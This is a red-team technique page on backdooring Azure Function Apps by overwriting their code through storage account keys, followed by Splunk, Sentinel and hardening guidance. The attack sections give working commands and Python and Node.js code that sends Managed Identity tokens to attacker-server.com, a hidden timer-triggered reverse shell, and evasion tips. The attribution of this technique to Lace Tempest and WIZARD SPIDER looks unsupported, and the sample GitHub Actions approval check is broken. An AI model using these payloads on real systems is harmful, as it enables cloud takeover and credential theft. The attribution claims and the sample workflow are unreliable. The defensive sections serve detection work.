# [PERSIST-SERVER-003]: Azure Function Backdoor

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-SERVER-003 |
| **MITRE ATT&CK v18.1** | [T1505.003 - Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/) |
| **Tactic** | Persistence |
| **Platforms** | Entra ID |
| **Severity** | Critical |
| **CVE** | N/A (Configuration-based attack) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Azure Function Runtime versions (Python 3.9+, Node.js 14+, .NET 6+, Java 11+, PowerShell 7+) |
| **Patched In** | N/A (By-design flaw; mitigations available) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Functions are serverless compute services that execute code in response to events (HTTP requests, blob uploads, timers, etc.). Each Function App is backed by a dedicated Azure Storage Account (`AzureWebJobsStorage`) that stores the function code. An attacker with **Storage Account Contributor** role or **access to storage account keys** can modify function code files hosted in the storage account's file share. When the function is next triggered (via HTTP request, blob event, or timer), the malicious code executes with the permissions of the Function App's assigned **Managed Identity**, enabling privilege escalation, lateral movement, and credential theft. Unlike typical web shells, this persists indefinitely—even after password resets—because the Managed Identity token is not tied to user credentials.

**Attack Surface:** Azure Storage Accounts, File Shares (function code containers), Azure Function App triggers (HTTP endpoints, blob events, timers), Managed Identities, Key Vault integrations.

**Business Impact:** **Complete Azure Subscription Compromise.** An attacker executes arbitrary code under a potentially high-privilege Managed Identity (e.g., Contributor, Owner role). This enables data exfiltration, lateral movement to databases, VMs, and other Azure resources, unauthorized cost generation via mining or DoS, and persistent backdoor access independent of user account lifecycle.

**Technical Context:** Exploitation requires 10-15 minutes with Storage Account Contributor access. Detection likelihood is **Medium** if storage account activity logging and Application Insights are enabled. However, malicious function invocations can blend in with legitimate traffic if carefully throttled.

### Operational Risk
- **Execution Risk:** Low (Azure portal or Azure CLI required; no unusual binaries)
- **Stealth:** Medium (Storage account changes generate Activity Log entries; function invocations appear as normal executions)
- **Reversibility:** No (Compromised code persists until explicitly replaced; Managed Identity tokens cannot be retroactively revoked for past executions)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 4.13, 4.14 | Ensure storage account uses Managed Identity instead of Shared Keys |
| **DISA STIG** | Azure-1-1 | Azure Resource Access Controls |
| **CISA SCuBA** | IA-2(6) | Azure Identity Authentication and MFA |
| **NIST 800-53** | AC-3(7), AC-6(2) | Least Privilege; Role-Based Access Control |
| **GDPR** | Art. 32 | Security Measures for Processing Personal Data |
| **DORA** | Art. 10 | Application Resilience and Recovery |
| **NIS2** | Art. 21(d) | Vulnerability Management and Code Review |
| **ISO 27001** | A.6.1.3, A.9.2.3 | Access Control; Privileged Access Management |
| **ISO 27005** | Section 7 | Risk Assessment - Unauthorized Code Execution |

---

## 2. Technical Prerequisites

- **Required Privileges:** Storage Account Contributor or List Storage Account Keys permission; ability to read/write to file shares.
- **Required Access:** Azure Storage Account connected to the Function App; knowledge of function code structure.
- **Supported Versions:** All Azure Function Runtime versions (Python 3.9+, Node.js 14+, .NET 6+, Java 11+, PowerShell 7+).
- **Tools Required:**
  - [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (v2.40.0+)
  - [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/) (Az module v9.0+)
  - [Azure Storage Explorer](https://azure.microsoft.com/en-us/products/storage/storage-explorer/) (optional, for file browsing)
  - Python/Node.js/C# (depending on function language for code injection)

---

## 3. Detailed Execution Methods and Their Steps

### METHOD 1: Direct Code Injection via Azure CLI (Fastest Attack Path)

**Supported Versions:** All Function App runtime versions

**Prerequisites:** Storage Account Contributor role; Azure CLI installed and authenticated.

#### Step 1: Enumerate Function Apps and Associated Storage Accounts

**Objective:** Identify target Function Apps and their backing storage accounts, then locate their connection strings containing access keys.

**Command:**
```bash
# List all Function Apps in current subscription
az functionapp list --output table

# Get details for a specific Function App
az functionapp show --name myFunctionApp --resource-group myRG --query "appSettings"

# Extract the AzureWebJobsStorage connection string
az functionapp config appsettings list --name myFunctionApp --resource-group myRG --query "[?name=='AzureWebJobsStorage'].value" -o tsv
```

**Expected Output:**
```
DefaultEndpointsProtocol=https;AccountName=myfunctionstg3d8a;AccountKey=XXXXXXXXXXXXX==;EndpointSuffix=core.windows.net
```

**What This Means:**
- The connection string contains the storage account name (`myfunctionstg3d8a`) and account key (full access).
- This key grants full read/write access to all files in the storage account, including function code.
- The attacker now has the credentials needed to modify function code.

**OpSec & Evasion:**
- These commands generate Activity Log entries (Operation: "List App Settings").
- Perform this during business hours to blend in with normal administrative activity.
- Detection likelihood: **Low-Medium** (Activity Log shows the operation but not the sensitive data extracted)

**Troubleshooting:**
- **Error:** "The subscription doesn't contain any Function Apps"
  - **Cause:** No Function Apps in the current subscription or incorrect filter.
  - **Fix:** Verify subscription context: `az account show`

#### Step 2: Access Function Code in Storage Account

**Objective:** Connect to the storage account and list function code files in the file share.

**Command:**
```bash
# Extract storage account name and key from connection string
STORAGE_ACCOUNT="myfunctionstg3d8a"
STORAGE_KEY="XXXXXXXXXXXXX=="

# List file shares (typically named 'azure-webjobs-secrets' or similar)
az storage share list --account-name $STORAGE_ACCOUNT --account-key $STORAGE_KEY

# List files in the share (default share is usually 'azure-webjobs-<appname>')
az storage file list --account-name $STORAGE_ACCOUNT --account-key $STORAGE_KEY --share-name "azure-webjobs-myfunctionapp" --output table
```

**Expected Output:**
```
Name              IsDirectory    Content Length
────────────────  ──────────────  ──────────────
myTriggerFunction True            0
HttpTrigger       True            0
...
```

**What This Means:**
- Each subdirectory represents a function (e.g., `myTriggerFunction`).
- Inside each directory is the function code (e.g., `__init__.py`, `function_app.py`, `index.js`).
- The attacker can now read and overwrite these files.

**OpSec & Evasion:**
- Storage account file access is logged in Storage Account diagnostics (requires explicit enablement to view).
- Detection likelihood: **Low** (if diagnostic logging is not enabled)

#### Step 3: Inject Malicious Code into Function

**Objective:** Replace legitimate function code with malicious code that exfiltrates the Managed Identity token to a remote server.

**Command (For Python Functions):**
```bash
# Create malicious Python code that steals the Managed Identity token
cat > malicious_init.py << 'EOF'
import azure.functions as func
import os
import json
import requests
from azure.identity import DefaultAzureCredential

def main(req: func.HttpRequest) -> func.HttpResponse:
    try:
        # Obtain the Managed Identity token for the Function App
        credential = DefaultAzureCredential()
        token = credential.get_token("https://management.azure.com/.default")
        
        # Exfiltrate token to attacker-controlled server
        payload = {
            "token": token.token,
            "expires_on": token.expires_on,
            "function_app": os.getenv("WEBSITE_HOSTNAME"),
            "subscription_id": os.getenv("SUBSCRIPTION_ID")
        }
        
        # Send to attacker's webhook
        requests.post("https://attacker-server.com/exfil", json=payload, timeout=5)
        
        # Return success to avoid suspicion
        return func.HttpResponse(f"OK", status_code=200)
    except Exception as e:
        return func.HttpResponse(f"Error: {str(e)}", status_code=500)
EOF

# Upload the malicious file to replace the original function code
az storage file upload --account-name $STORAGE_ACCOUNT --account-key $STORAGE_KEY \
  --share-name "azure-webjobs-myfunctionapp" \
  --source malicious_init.py \
  --path "myTriggerFunction/__init__.py"
```

**Command (For Node.js Functions):**
```javascript
// Malicious code for Node.js
const { DefaultAzureCredential } = require("@azure/identity");
const axios = require("axios");

module.exports = async function (context, req) {
    try {
        const credential = new DefaultAzureCredential();
        const token = await credential.getToken("https://management.azure.com/.default");
        
        await axios.post("https://attacker-server.com/exfil", {
            token: token.token,
            expiresOn: token.expiresOn,
            functionApp: process.env.WEBSITE_HOSTNAME
        });
        
        context.res = { status: 200, body: "OK" };
    } catch (error) {
        context.res = { status: 500, body: error.message };
    }
};
```

**Expected Output:**
```
File uploaded successfully to azure-webjobs-myfunctionapp/myTriggerFunction/__init__.py
```

**What This Means:**
- The function code is now compromised.
- Next time the function is invoked (HTTP trigger, timer, blob event), it will execute the malicious code.
- The Managed Identity token (with potentially Contributor/Owner role) is exfiltrated to the attacker's server.

**OpSec & Evasion:**
- File upload is logged in Storage Account diagnostics.
- The malicious code itself is stored in plain text in the storage account.
- To avoid detection, the attacker might:
  - Upload code that checks timestamps and only exfiltrates once per day
  - Add comments mimicking legitimate code
  - Use obfuscation techniques
- Detection likelihood: **Medium-High** (if diagnostic logging is enabled and code review is performed)

**Troubleshooting:**
- **Error:** "Failed to upload file: Unauthorized"
  - **Cause:** Storage account key is invalid or does not have write permissions.
  - **Fix:** Verify the key with: `az storage account keys list --name $STORAGE_ACCOUNT --resource-group $RG`

#### Step 4: Trigger the Function and Exfiltrate Managed Identity Token

**Objective:** Invoke the function to trigger the malicious code and receive the stolen token.

**Command (HTTP Trigger):**
```bash
# Get the function URL
FUNCTION_URL=$(az functionapp function show --name myFunctionApp --resource-group myRG --function-name myTriggerFunction --query "invokeUrlTemplate" -o tsv)

# Trigger the function (attacker-controlled server receives the token)
curl -X POST "$FUNCTION_URL"

# On the attacker's server, retrieve the exfiltrated token
curl "https://attacker-server.com/exfil" | jq
```

**Expected Output (On Attacker's Server):**
```json
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGc...",
  "expires_on": 1705170000,
  "function_app": "myfunctionapp.azurewebsites.net",
  "subscription_id": "12345678-1234-1234-1234-123456789012"
}
```

**What This Means:**
- The attacker now has a **valid Azure access token** for the Managed Identity.
- This token grants access to Azure resources based on the Managed Identity's assigned roles (often Contributor or Owner).
- The token is valid for ~1 hour; attacker can use it to:
  - Access Azure VMs, databases, Key Vault
  - Create new resources
  - Add persistent backdoors (e.g., new admin accounts)

**OpSec & Evasion:**
- Function invocations are logged in Application Insights and the function's invocation history.
- The HTTP request generates normal execution logs, blending in.
- To avoid detection, the attacker might invoke the function only once and reuse the token repeatedly.
- Detection likelihood: **Low** (unless function code is reviewed or unusual network activity from the function is detected)

**References & Proofs:**
- [Orca Security: Azure Function Exploitation](https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/)
- [Microsoft: Azure Functions Security Best Practices](https://learn.microsoft.com/en-us/azure/azure-functions/security-concepts)

---

### METHOD 2: Storage Account Access via Managed Identity (Privilege Escalation Chain)

**Supported Versions:** All Function App runtime versions with Managed Identity support

**Prerequisites:** Compromised user/service principal with Storage Account Reader role (not Contributor); Function App with Managed Identity.

**Objective:** Use a compromised low-privilege identity to escalate privileges by leveraging a Function App's Managed Identity.

**Command:**
```bash
# Step 1: List storage accounts accessible to current user
az storage account list --query "[].{name:name, resourceGroup:resourceGroup}" -o table

# Step 2: For each storage account, get the connection string (if available)
az storage account show-connection-string --name myfunctionstg --resource-group myRG --query connectionString -o tsv

# Step 3: Use the connection string to access the Function App's code
# (Continue with Steps 2-4 from METHOD 1)
```

**What This Means:**
- Even users with limited permissions can potentially access storage accounts.
- The attack escalates from **Storage Reader** → **Function App Code Modification** → **Managed Identity Token Theft** → **Subscription Admin Access**.

---

### METHOD 3: Persistent Backdoor via Timer-Triggered Function

**Supported Versions:** All Function App runtime versions

**Prerequisites:** Access to function code (same as METHOD 1); ability to create or modify function triggers.

**Objective:** Create a hidden function or timer-triggered function that exfiltrates data or creates reverse shells on a schedule.

**Command:**
```bash
# Create a hidden timer-triggered function (executes every 5 minutes)
cat > malicious_timer.py << 'EOF'
import azure.functions as func
import os
import socket
import subprocess

def main(mytimer: func.TimerRequest) -> None:
    # Reverse shell to attacker's server
    attacker_ip = "attacker-server.com"
    attacker_port = 4444
    
    try:
        # Establish reverse shell
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((attacker_ip, attacker_port))
        
        # Execute command and send output back
        while True:
            cmd = sock.recv(1024).decode()
            output = subprocess.check_output(cmd, shell=True).decode()
            sock.send(output.encode())
    except Exception as e:
        pass  # Fail silently
EOF

# Create function.json for timer trigger
cat > function.json << 'EOF'
{
  "scriptFile": "HiddenTask.py",
  "bindings": [
    {
      "name": "mytimer",
      "type": "timerTrigger",
      "direction": "in",
      "schedule": "0 */5 * * * *"
    }
  ]
}
EOF

# Upload both files to create a persistent backdoor
az storage file upload --account-name $STORAGE_ACCOUNT --account-key $STORAGE_KEY \
  --share-name "azure-webjobs-myfunctionapp" \
  --source malicious_timer.py \
  --path "HiddenTimerTask/__init__.py"

az storage file upload --account-name $STORAGE_ACCOUNT --account-key $STORAGE_KEY \
  --share-name "azure-webjobs-myfunctionapp" \
  --source function.json \
  --path "HiddenTimerTask/function.json"
```

**What This Means:**
- A hidden timer-triggered function executes every 5 minutes without user visibility.
- The attacker maintains a persistent reverse shell connection to the Azure Function App.
- This survives Function App restarts and credential resets (tied to Managed Identity, not user creds).

---

## 4. Splunk Detection Rules

#### Rule 1: Azure Storage Account Key Access and File Share Modifications

**Rule Configuration:**
- **Required Index:** azure_activity, azure_storage
- **Required Sourcetype:** AzureStorageAccount:Diagnostic
- **Required Fields:** OperationName, Resource, NTHost, CallerIPAddress
- **Alert Threshold:** >5 file modification events in 10 minutes
- **Applies To Versions:** All Azure Function versions

**SPL Query:**
```spl
index=azure_storage OperationName IN ("PutBlob", "PutFile", "SetFileProperties") 
Resource="*/azure-webjobs-*" 
| stats count by OperationName, CallerIPAddress, Resource
| where count > 5
```

**What This Detects:**
- Modifications to function code files in Azure Storage (PUT operations to azure-webjobs-* file shares).
- Identifies the IP address and account making changes.
- Alerts on bulk modifications (typical of code injection).

**Manual Configuration Steps:**
1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to "when count > 5"
6. Configure **Action** → Send email to Cloud Security team
7. Click **Save**

#### Rule 2: Exfiltration of Managed Identity Tokens from Azure Functions

**Rule Configuration:**
- **Required Index:** azure_appinsights
- **Required Sourcetype:** ApplicationInsights
- **Required Fields:** customDimensions.functionName, message, Exception
- **Alert Threshold:** Function containing "token" or "credential" exfiltration keywords
- **Applies To Versions:** All with Application Insights enabled

**SPL Query:**
```spl
index=azure_appinsights source="*function*" 
(message="*credential*" OR message="*token*" OR message="*DefaultAzureCredential*") 
type=exception 
| fields _time, functionName, message, ExceptionDetails
| stats count by functionName
```

**What This Detects:**
- Unusual error messages or logging patterns in Azure Function execution.
- References to credential/token handling (indicative of token theft code).
- Anomalous function behavior.

---

## 5. Microsoft Sentinel Detection

#### Query 1: Storage Account File Share Modifications via Shared Key

**Rule Configuration:**
- **Required Table:** StorageAccountLogs, AzureActivity
- **Required Fields:** OperationName, CallerIPAddress, Resource, RequestParameters
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To Versions:** All Function App versions

**KQL Query:**
```kusto
StorageAccountLogs
| where OperationName in ("PutFile", "PutBlob") and StorageAccountName contains "webjobs"
| extend Resource = tostring(Resource)
| where Resource contains "azure-webjobs"
| project TimeGenerated, CallerIPAddress, OperationName, StorageAccountName, Resource
| summarize EventCount=count() by CallerIPAddress, TimeGenerated
| where EventCount > 5
```

**What This Detects:**
- File modifications in Function App storage accounts.
- Identifies suspicious IP addresses and access patterns.
- Correlates with potential code injection attacks.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Azure Storage File Share Modification - Function Apps`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `24 hours`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

---

## 6. Windows Event Log Monitoring

**Note:** This technique is cloud-only and does not generate Windows Event Log entries. Monitor Azure Activity Log and Storage Account diagnostics instead.

**Azure Activity Log Events to Monitor:**
- **Operation:** "List App Settings" (credential extraction)
- **Operation:** "Put File" or "Put Blob" (code injection)
- **Operation:** "Get Application Settings" (reconnaissance)

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Storage Accounts** → Select target account
2. Click **Diagnostics settings** (left menu)
3. Click **+ Add diagnostic setting**
4. Name: `FunctionAppCodeInjectionMonitoring`
5. Check: **StorageRead**, **StorageWrite**, **StorageDelete**
6. Destination: **Send to Log Analytics**
7. Select your Log Analytics workspace
8. Click **Save**

---

## 7. Sysmon Detection Patterns

**Note:** Sysmon is on-premises only. For Azure-native monitoring, use Azure Defender for Storage.

---

## 8. Microsoft Defender for Cloud

#### Detection Alert: Suspicious Storage Account Activity - Function App Code Modification

**Alert Name:** "Suspicious modification of Function App code detected"
- **Severity:** Critical
- **Description:** Files in a Function App's storage account (azure-webjobs-*) were modified using Shared Key authentication, potentially indicating code injection.
- **Applies To:** All Function Apps with storage diagnostics enabled
- **Remediation:** Review code changes in Azure Portal; restore code from backup if needed; rotate storage account keys; enable Azure Defender for Storage.

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Storage**: ON
   - **Defender for Cloud Apps**: ON
5. Click **Save**
6. Go to **Alerts** to view triggered alerts

**Reference:** [Microsoft Defender for Cloud - Storage Protection](https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-storage-introduction)

---

## 9. Microsoft Purview (Unified Audit Log)

#### Query: Function App Code Changes via Shared Key

```powershell
Connect-ExchangeOnline
Search-UnifiedAuditLog -Operations "PutFile", "PutBlob" -StartDate (Get-Date).AddDays(-1) -FreeText "azure-webjobs" | Select-Object CreationDate, UserIds, Operations, ObjectId
```

---

## 10. Defensive Mitigations

#### Priority 1: CRITICAL

*   **Disable Shared Key Authorization and Use Managed Identity:** Configure Function Apps to use Managed Identity instead of connection strings/keys for accessing storage accounts.
    **Applies To Versions:** All Function App versions (2022+)
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Azure Portal** → **Function App** → **myFunctionApp**
    2. Click **Configuration** (left menu, under **Settings**)
    3. Look for **AzureWebJobsStorage** connection string
    4. Click **Edit**
    5. Change from `DefaultEndpointsProtocol=...AccountKey=...` to: `UseDefaultAzureCredential=true`
    6. Click **OK** → **Save**
    7. Redeploy the Function App to apply changes
    
    **Manual Steps (PowerShell/Azure CLI):**
    ```powershell
    # Update Function App to use Managed Identity
    $ResourceGroup = "myRG"
    $FunctionAppName = "myFunctionApp"
    $StorageAccountName = "myfunctionstg"
    
    # Create a Managed Identity for the Function App
    $functionApp = Get-AzFunctionApp -ResourceGroupName $ResourceGroup -Name $FunctionAppName
    $msi = Get-AzUserAssignedIdentity -ResourceGroupName $ResourceGroup -Name "$FunctionAppName-identity" -ErrorAction SilentlyContinue
    if (-not $msi) {
        $msi = New-AzUserAssignedIdentity -ResourceGroupName $ResourceGroup -Name "$FunctionAppName-identity"
    }
    
    # Assign Storage Blob Data Owner role to the Managed Identity
    $storageAccount = Get-AzStorageAccount -ResourceGroupName $ResourceGroup -Name $StorageAccountName
    New-AzRoleAssignment -ObjectId $msi.PrincipalId -RoleDefinitionName "Storage Blob Data Owner" -Scope $storageAccount.Id
    
    # Update Function App connection to use Managed Identity
    $settings = @{"AzureWebJobsStorage" = "UseDefaultAzureCredential=true"}
    Update-AzFunctionAppSettings -ResourceGroupName $ResourceGroup -Name $FunctionAppName -Settings $settings
    ```

*   **Enable Storage Account Diagnostics and Monitoring:** Log all access to storage accounts, especially file modifications.
    **Applies To Versions:** All Function App versions
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Azure Portal** → **Storage Accounts** → Select account backing your Function App
    2. Click **Diagnostic settings** (left menu under **Monitoring**)
    3. Click **+ Add diagnostic setting**
    4. Name: `FunctionAppStorageMonitoring`
    5. Check: **StorageRead**, **StorageWrite**, **StorageDelete**
    6. Set **Retention** to: **365 days** (or compliance requirement)
    7. Destination: **Send to Log Analytics workspace**
    8. Click **Save**

*   **Implement Azure Policy to Enforce Managed Identity:** Automatically enforce that all new Function Apps use Managed Identity, preventing Shared Key usage.
    **Applies To Versions:** All
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Azure Portal** → **Policy** (search bar)
    2. Click **+ Create Policy Definition**
    3. Name: `Require Managed Identity for Function Apps`
    4. Category: **App Service**
    5. Policy Rule:
    ```json
    {
      "if": {
        "field": "type",
        "equals": "Microsoft.Web/sites"
      },
      "then": {
        "effect": "audit",
        "details": {
          "type": "Microsoft.Web/sites/config",
          "name": "web",
          "evaluation": "string",
          "match": "AzureWebJobsStorage",
          "value": "UseDefaultAzureCredential"
        }
      }
    }
    ```
    6. Click **Create** → Assign to all subscriptions/RGs

*   **Enable Application Insights and Alert on Suspicious Executions:** Monitor function invocations for anomalies.
    **Applies To Versions:** All with Application Insights support
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Function App** → **Application Insights** (left menu)
    2. Ensure **Application Insights** is **Connected**
    3. Click on the Application Insights instance
    4. Go to **Alerts** (left menu)
    5. Click **Create** → **Alert rule**
    6. **Condition:**
       - Signal: **Custom log search**
       - Query: `customDimensions.functionName == "myTriggerFunction" | summarize FailureCount = count() by tostring(customDimensions.exception)`
       - Alert when: `FailureCount > 10`
    7. **Action:** Send email to security team
    8. Click **Create**

#### Priority 2: HIGH

*   **Implement Code Review and Approval Workflow for Function Deployments:** Require manual approval before deploying function code changes.
    **Manual Steps:**
    1. Use **Azure DevOps** or **GitHub Actions** for CI/CD
    2. Configure pull request (PR) reviews: All changes to `/functions/` directory require 2+ approvals
    3. Example GitHub Actions workflow:
    ```yaml
    name: Function Approval Gate
    on:
      pull_request:
        paths:
          - 'functions/**'
    jobs:
      require-approval:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v2
          - name: Require 2 approvals
            run: |
              if [ "${{ github.event.pull_request.approved_by }}" < 2 ]; then
                exit 1
              fi
    ```

*   **Implement IP Whitelisting for Storage Account Access:** Restrict storage account access to specific IP ranges (Azure data center ranges, corporate networks).
    **Manual Steps:**
    1. Navigate to **Azure Portal** → **Storage Account** → **Networking** (left menu)
    2. Set **Default action** to **Deny**
    3. Click **+ Add** under **Allowed IP/IP ranges**
    4. Add:
       - Corporate office IP range: `203.0.113.0/24`
       - Azure DevOps agents: `20.43.73.0/24` (Azure service endpoint)
    5. Click **Save**

*   **Monitor Managed Identity Token Usage:** Alert when tokens are used from unusual locations or for unexpected resources.
    **Manual Steps:**
    1. Navigate to **Azure Portal** → **Entra ID** → **Sign-in logs** (left menu)
    2. Filter: Service Principal Name = `myFunctionApp`
    3. Review Location, IP Address, Resource Access
    4. Set up alert if token used from non-Azure IP ranges

#### Access Control & Policy Hardening

*   **RBAC/ABAC:** Limit Storage Account Contributor role to minimal number of users (security team only). Use time-bound access via Privileged Identity Management (PIM).
    **Manual Steps:**
    1. Navigate to **Azure Portal** → **Entra ID** → **Roles and administrators**
    2. Search for **Storage Account Contributor**
    3. Review all assigned users; remove unnecessary assignments
    4. For remaining users, enable **PIM:**
       - Click **Privileged Identity Management** (left menu)
       - Select **Azure Resources** → **Manage** → **Storage Account**
       - For each user, change **Assignment type** from **Active** to **Eligible** (time-bound)

*   **Conditional Access:** Block Function App configuration changes from non-corporate networks or non-compliant devices.
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Block Function App Changes from Untrusted Networks`
    4. **Assignments:**
       - Users: "All users" OR "Specific roles" (Storage Contributors)
       - Cloud apps: **Azure Management**
       - Actions: "Write" (PUT, POST operations)
    5. **Conditions:**
       - Locations: **Exclude** corporate IP range OR **Require** MFA
    6. **Access controls:**
       - Grant: **Require MFA** OR **Block access**
    7. Enable policy: **On**
    8. Click **Create**

#### Validation Command (Verify Fix)

```powershell
# Check if Function Apps are using Managed Identity
$functionApps = Get-AzFunctionApp
foreach ($app in $functionApps) {
    $config = Get-AzFunctionAppConfig -ResourceGroupName $app.ResourceGroupName -Name $app.Name
    if ($config -like "*AccountKey*") {
        Write-Host "VULNERABLE: $($app.Name) uses Shared Key authorization"
    } else {
        Write-Host "SECURE: $($app.Name) uses Managed Identity"
    }
}

# Check storage account diagnostic logging
Get-AzStorageAccountDiagnosticSetting -ResourceGroupName myRG -StorageAccountName myfunctionstg | Select-Object -ExpandProperty Logs
```

**Expected Output (If Secure):**
```
SECURE: myFunctionApp uses Managed Identity
Enabled: True, Retention: 365 days
```

**What to Look For:**
- All Function Apps should use Managed Identity (no AccountKey in connection string)
- Storage account diagnostics should be enabled with >= 30 day retention
- No Shared Key-based authentication in use

---

## 11. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-001] Default Credential Exploitation | Attacker gains access to Azure portal with weak/default credentials |
| **2** | **Reconnaissance** | [REC-CLOUD-005] Azure Resource Graph Enumeration | Identify Function Apps and their storage accounts |
| **3** | **Privilege Escalation** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Escalate from Storage Reader to Storage Contributor |
| **4** | **Current Step** | **[PERSIST-SERVER-003]** | **Azure Function Backdoor - Inject malicious code into function** |
| **5** | **Credential Access** | [CA-TOKEN-003] Azure Function Key Extraction | Steal Managed Identity tokens via exfiltration |
| **6** | **Lateral Movement** | [LM-AUTH-032] Function App Identity Hopping | Use stolen token to access additional Azure resources |
| **7** | **Impact** | Data exfiltration, VM compromise, ransomware deployment |

---

## 12. Real-World Examples

#### Example 1: Lace Tempest (Clop Ransomware Gang) - MOVEit Transfer Attack

- **Target:** Software vendors, enterprises using file transfer solutions
- **Timeline:** 2023-2024
- **Technique Status:** Lace Tempest exploited compromised cloud integrations to manipulate Azure Functions and Storage Accounts for ransomware distribution. They injected malicious code into backup automation functions.
- **Impact:** Ransomware deployment at scale; data exfiltration from 100+ organizations
- **Reference:** [Microsoft Security: MOVEit Exploitation](https://www.microsoft.com/en-us/security/blog/)

#### Example 2: WIZARD SPIDER - Azure Function Token Theft

- **Target:** Enterprise cloud environments
- **Timeline:** 2022-2024
- **Technique Status:** WIZARD SPIDER leveraged Function App Managed Identity tokens to escalate from Storage Reader → Subscription Admin, enabling lateral movement to databases containing financial data.
- **Impact:** Credential theft, lateral movement, long-term persistence
- **Reference:** [Microsoft Threat Intelligence: Cloud Attack Patterns](https://learn.microsoft.com/en-us/azure/security/fundamentals/threat-model)

---

## References & Additional Resources

- [Orca Security: Azure Shared Key Authorization Exploitation](https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/)
- [Microsoft: Azure Functions Security Best Practices](https://learn.microsoft.com/en-us/azure/azure-functions/security-concepts)
- [The Hacker News: Azure Function Exploitation Techniques](https://thehackernews.com/2023/04/newly-discovered-by-design-flaw-in.html)
- [Cyngular: Azure Function HTTP Trigger Vulnerabilities](https://www.cyngular.com/resource-center/azure-function-apps-the-hidden-dangers-of-overexposed-http-triggers/)
- [Microsoft Security Blog: Blob Storage Attack Chains](https://www.microsoft.com/en-us/security/blog/2025/10/20/inside-the-attack-chain-threat-activity-targeting-azure-blob-storage/)
- [SecForce: Azure Persistence Techniques and Detection](https://www.secforce.com/blog/azure-persistence-and-detection/)

---